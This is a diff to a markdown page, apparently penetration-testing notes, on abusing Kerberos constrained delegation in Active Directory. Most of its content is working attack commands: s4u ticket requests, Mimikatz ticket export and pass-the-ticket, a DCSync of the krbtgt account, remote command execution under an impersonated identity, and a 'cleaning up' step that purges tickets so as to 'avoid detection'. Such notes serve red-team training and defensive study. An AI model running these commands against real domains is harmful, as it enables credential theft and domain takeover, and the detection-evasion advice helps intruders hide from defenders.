@@ -1,3 +1,10 @@
+---
+description: >-
+  Dive into our comprehensive article exploring the intricacies of Constrained
+  Delegation. Uncover its functions, role, and understanding its impact for an
+  effective system management strategy.
+---
+
 # 🟢 Constrained Delegation
 
 **Enumerate users with contrained delegation enabled**
@@ -62,3 +69,55 @@ Tgs::s4u /tgt:<kirbi file> /user:Administrator@<domain> /service:time/dcorp-dc.d
 Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
 ```
+
+#### Additional Enumeration Techniques
+
+Discover additional services allowing delegation:
+
+```
+Get-ADObject -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne '$null'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+```
+
+#### Further Exploitation
+
+**Extract and Use TGT**
+
+Using the extracted TGT for impersonation:
+
+```
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+```
+
+Then, using the ticket:
+
+```
+Invoke-Mimikatz -Command '"kerberos::ptt <path to .kirbi ticket>"'
+```
+
+**Execute Commands with the Impersonated Identity**
+
+Once ticket is injected, use it to execute commands:
+
+```
+Invoke-Command -ScriptBlock { whoami; Get-Process } -Credential $cred -ComputerName
+```
+
+Where `$cred` is a PSCredential object created with the credentials of any user you've impersonated.
+
+#### Cleaning Up
+
+Remember to remove any traces of your activities:
+
+```
+Invoke-Mimikatz -Command '"kerberos::purge"'
+```
+
+This ensures the removal of all Kerberos tickets from the current session and helps avoid detection.
+
+#### Additional Resources
+
+For more information on Kerberos delegation and related attacks, refer to the following resources:
+
+* [Microsoft Documentation on Kerberos Constrained Delegation](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
+* [Harmj0y's Guide to Kerberos Abuse](https://www.harmj0y.net/blog/tag/kerberos/)
